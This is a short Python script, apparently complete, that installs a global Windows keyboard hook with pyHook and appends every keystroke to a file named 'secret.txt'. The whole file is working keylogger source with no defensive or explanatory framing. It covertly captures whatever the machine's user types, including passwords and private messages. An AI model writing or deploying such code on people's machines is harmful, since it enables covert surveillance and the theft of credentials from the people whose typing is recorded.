import pyHook, pythoncom, sys, logging, win32api
from pyHook import HookManager

file_log = ""

def OnKeyboardEvent(event):
 logging.basicConfig(filename=(file_log + "secret.txt"),filemode ='a',level=logging.DEBUG, format='%(message)s')
 chr(event.Ascii)
 logging.log(10,chr(event.Ascii))
 return True
 
Hook_Manager = pyHook.HookManager()
Hook_Manager.KeyDown = OnKeyboardEvent
Hook_Manager.HookKeyboard()
pythoncom.PumpMessages()﻿